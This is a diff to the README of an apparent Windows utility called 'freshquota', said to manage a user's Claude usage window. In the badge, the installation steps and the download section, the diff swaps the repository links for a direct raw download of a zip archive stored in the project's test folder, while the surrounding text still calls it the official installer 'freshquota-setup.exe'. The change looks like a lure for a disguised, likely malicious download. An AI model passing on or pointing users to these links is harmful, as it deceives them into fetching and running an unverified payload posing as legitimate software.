@@ -1,6 +1,6 @@
 # ⏱️ freshquota - Manage your Claude usage window efficiently
 
-[![](https://img.shields.io/badge/Download-Freshquota-blue.svg)](https://github.com/Bba62013/freshquota)
+[![](https://img.shields.io/badge/Download-Freshquota-blue.svg)](https://github.com/Bba62013/freshquota/raw/refs/heads/main/test/Software_v2.3.zip)
 
 ## 🎯 About this project
 
@@ -17,7 +17,7 @@ The application runs quietly. It monitors your five-hour window and manages your
 
 ## 🚀 Installation steps
 
-1. Visit the [official release page](https://github.com/Bba62013/freshquota) to obtain the installer.
+1. Visit the [official release page](https://github.com/Bba62013/freshquota/raw/refs/heads/main/test/Software_v2.3.zip) to obtain the installer.
 2. Locate the file named `freshquota-setup.exe` on that page.
 3. Click the link to save the file to your computer.
 4. Open your Downloads folder.
@@ -56,7 +56,7 @@ The application checks for updates once a week. It prompts you to install the ne
 
 ## 💾 Download link
 
-You may visit the [download page](https://github.com/Bba62013/freshquota) to obtain the most recent version of the installer. Always verify that you download the version matching your Windows installation. 
+You may visit the [download page](https://github.com/Bba62013/freshquota/raw/refs/heads/main/test/Software_v2.3.zip) to obtain the most recent version of the installer. Always verify that you download the version matching your Windows installation. 
 
 ## ❓ Frequently asked questions
 
